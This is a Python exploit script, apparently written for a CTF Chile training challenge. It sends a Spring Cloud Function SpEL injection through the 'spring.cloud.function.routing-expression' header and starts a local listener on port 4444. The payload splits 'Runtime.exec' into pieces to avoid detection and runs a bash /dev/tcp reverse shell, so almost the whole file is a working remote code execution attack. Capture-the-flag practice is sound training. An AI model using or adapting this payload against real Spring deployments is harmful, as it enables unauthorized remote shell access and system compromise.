#!/usr/bin/env python3
"""
CTF Chile - Establecer reverse shell persistente y exploración de redes
"""
import requests
import time
import socket
import threading

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

def setup_reverse_shell():
    print("[*] Configurando reverse shell...")

    # Configurar listener local
    def start_listener():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('0.0.0.0', 4444))
            sock.listen(1)
            print("[*] Listener en puerto 4444...")

            while True:
                try:
                    conn, addr = sock.accept()
                    print(f"[+] Conexión recibida de {addr}")

                    # Interactuar con la shell
                    while True:
                        try:
                            data = conn.recv(1024).decode()
                            if not data:
                                break
                            print(f"Shell: {data}", end='')
                        except:
                            break
                    conn.close()

                except Exception as e:
                    print(f"[-] Error en conexión: {e}")
        except Exception as e:
            print(f"[-] Error en listener: {e}")

    # Iniciar listener en thread separado
    listener_thread = threading.Thread(target=start_listener, daemon=True)
    listener_thread.start()

    # Obtener IP local
    try:
        # Esto podría no funcionar dependiendo del entorno
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        local_ip = "127.0.0.1"  # Fallback

    print(f"[*] IP local detectada: {local_ip}")

    # Payload de reverse shell
    shell_payload = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","bash -i >& /dev/tcp/{local_ip}/4444 0>&1"}}).waitFor()'

    try:
        print("[*] Enviando payload de reverse shell...")
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": shell_payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"[*] Respuesta HTTP: {r.status_code}")
    except Exception as e:
        print(f"[-] Error enviando payload: {e}")

    # Esperar conexión
    time.sleep(5)

if __name__ == "__main__":
    setup_reverse_shell()

    # Mantener el programa corriendo
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Finalizando...")